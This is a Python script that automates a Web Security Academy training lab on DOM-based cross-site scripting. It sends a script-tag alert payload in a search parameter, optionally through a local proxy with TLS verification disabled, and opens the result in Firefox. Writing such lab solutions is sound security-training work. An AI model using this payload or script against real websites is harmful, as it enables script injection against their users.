#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Cross-Site Scripting (XSS) Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c 'test"><script>alert("XSS")</script>' -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c 'test"><script>alert("XSS")</script>' 
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: test"><script>alert(\'XSS\')</script>', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def xss(url, command):
    params = {
        'search': command
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        requests.get(url, params=params, verify=False, proxies=proxies)
    else:
        r = requests.get(url, params=params, verify=False)
        # verify the response contains the script tag
        if (b'&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;' in r.content):
            path = url + '/?search=' + command
            print("(+) DOM-based XSS Successful!")
            subprocess.call(["firefox", path])
        else:
            print("(-) DOM-based XSS Failed")

def main():
    
    print("(+) Exploiting DOM-based XSS")
        
    xss(url, command)

if __name__ == "__main__":
    main()
